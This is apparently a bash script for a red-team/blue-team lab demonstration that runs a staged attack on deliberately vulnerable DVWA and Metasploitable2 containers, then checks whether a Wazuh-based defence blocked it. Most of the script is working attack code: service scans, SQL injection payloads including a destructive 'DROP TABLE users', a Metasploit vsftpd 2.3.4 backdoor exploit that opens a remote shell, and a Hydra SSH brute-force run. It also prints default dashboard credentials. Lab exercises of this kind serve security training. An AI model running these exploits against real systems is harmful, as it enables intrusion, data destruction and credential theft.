#!/bin/bash
# RedBlue Arena — automated attack sequence (presentation edition)
# Run this INSIDE the red.kali container:
#   docker exec -it rba-red-kali bash /root/attack.sh

RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
BOLD='\033[1m'
NC='\033[0m'

TARGET="target.dvwa"

banner() {
  echo -e "${MAGENTA}"
  echo "  RED TEAM  —  CYBER KILL-CHAIN SIMULATOR"
  echo -e "${NC}"
  echo -e "${CYAN}${BOLD}          C Y B E R   K I L L - C H A I N   S I M U L A T O R${NC}"
  echo -e "${CYAN}                 Live Attack Sequence — Target: ${TARGET}${NC}"
  echo ""
}

step() {
  echo ""
  echo -e "${YELLOW}${BOLD}==============================================================${NC}"
  echo -e "${YELLOW}${BOLD} [PHASE] $1${NC}"
  echo -e "${YELLOW}${BOLD}==============================================================${NC}"
  sleep 1
}

typing() {
  echo -ne "${GREEN}"
  echo "$1" | while IFS= read -r -n1 c; do echo -n "$c"; sleep 0.008; done
  echo -e "${NC}"
}

clear
banner
sleep 1
typing "[*] Initializing Red Team toolkit — Kali Linux + Metasploit + Nmap"
sleep 1

step "1 - RECONNAISSANCE"
typing "[*] Running service/version scan against $TARGET ..."
nmap -sV -T4 "$TARGET" | tee /root/scan-results.txt
echo -e "${GREEN}[+] Reconnaissance complete — open services identified.${NC}"
sleep 1

step "2 - DEEP VULNERABILITY SCAN"
typing "[*] Running aggressive scan (OS detection, scripts, traceroute) ..."
nmap -A -T4 "$TARGET" | tee -a /root/scan-results.txt
echo -e "${GREEN}[+] Vulnerability scan complete.${NC}"
sleep 1

step "3 - WEB ATTACK SURFACE MAPPING"
for path in login.php setup.php vulnerabilities/ config/config.inc.php; do
  echo -ne "${CYAN} -> probing /$path ... ${NC}"
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/$path")
  echo -e "${GREEN}[$code]${NC}"
  sleep 0.3
done

step "4 - SQL INJECTION EXPLOITATION"
payloads=("1' OR '1'='1" "1' UNION SELECT null,null-- -" "'; DROP TABLE users-- -")
for payload in "${payloads[@]}"; do
  echo -e "${RED}[EXPLOIT]${NC} injecting payload: ${BOLD}${payload}${NC}"
  curl -s -o /dev/null -G "http://$TARGET/vulnerabilities/sqli/" --data-urlencode "id=$payload" --data-urlencode "Submit=Submit"
  sleep 0.5
done
echo -e "${GREEN}[+] SQL injection attempts sent.${NC}"

step "5 - METASPLOIT EXPLOIT MODULE (DVWA recon)"
typing "[*] Launching Metasploit auxiliary scanner against $TARGET ..."
msfconsole -q -x "
use auxiliary/scanner/http/http_version;
set RHOSTS $TARGET;
run;
exit
"
echo -e "${GREEN}[+] DVWA attack phase complete.${NC}"

MSF2="target.metasploitable2"

step "6 - RECON: METASPLOITABLE2"
typing "[*] Scanning second target ($MSF2) for open services..."
nmap -sV -T4 "$MSF2" | tee /root/scan-results-msf2.txt
echo -e "${GREEN}[+] Metasploitable2 recon complete.${NC}"
sleep 1

step "7 - REAL EXPLOIT: vsftpd 2.3.4 BACKDOOR"
typing "[*] This is the famous vsftpd backdoor exploit — gives a real remote shell."
msfconsole -q -x "
use exploit/unix/ftp/vsftpd_234_backdoor;
set RHOSTS $MSF2;
run -j;
sleep 6;
sessions -l;
sessions -c id -i 1;
exit -y
" 2>&1 | tee /root/exploit-results.txt
echo -e "${GREEN}[+] If a session opened above, that 'id' output is a REAL remote command executed on the target.${NC}"
sleep 1

step "8 - BRUTE-FORCE ATTACK (SSH credential guessing)"
typing "[*] Attempting to guess SSH credentials on $MSF2 using Hydra..."
hydra -l msfadmin -P /root/wordlist.txt -t 4 -f "$MSF2" ssh || true
echo -e "${GREEN}[+] Brute-force attempt complete.${NC}"

echo ""
echo -e "${MAGENTA}${BOLD}================================================================${NC}"
echo -e "${GREEN}${BOLD} [DONE] Full attack sequence complete (DVWA + Metasploitable2).${NC}"
echo -e "${CYAN} Check the Wazuh dashboard now for live detections:${NC}"
echo -e "${CYAN}   https://localhost  (admin / SecretPassword)${NC}"
echo -e "${MAGENTA}${BOLD}================================================================${NC}"

step "9 - BLUE TEAM RESPONSE CHECK"
typing "[*] Waiting for Blue Team's automated response to take effect..."
sleep 10

echo -e "${CYAN}[*] Re-attempting connection to DVWA ($TARGET) ...${NC}"
if curl -s -m 5 -o /dev/null -w "%{http_code}" "http://$TARGET/" > /tmp/code 2>/dev/null; then
  code=$(cat /tmp/code)
  if [ "$code" == "000" ] || [ -z "$code" ]; then
    echo -e "${RED}${BOLD}[BLOCKED] DVWA connection refused/timed out — Blue Team firewalled this attacker!${NC}"
  else
    echo -e "${YELLOW}[*] DVWA still reachable (HTTP $code) — threshold not met yet.${NC}"
  fi
else
  echo -e "${RED}${BOLD}[BLOCKED] DVWA connection refused/timed out — Blue Team firewalled this attacker!${NC}"
fi

echo -e "${CYAN}[*] Re-attempting SSH connection to Metasploitable2 ($MSF2) ...${NC}"
if timeout 5 bash -c "cat < /dev/null > /dev/tcp/$MSF2/22" 2>/dev/null; then
  echo -e "${YELLOW}[*] Metasploitable2 SSH still reachable — threshold not met yet.${NC}"
else
  echo -e "${RED}${BOLD}[BLOCKED] Metasploitable2 SSH unreachable — Blue Team firewalled this attacker!${NC}"
fi
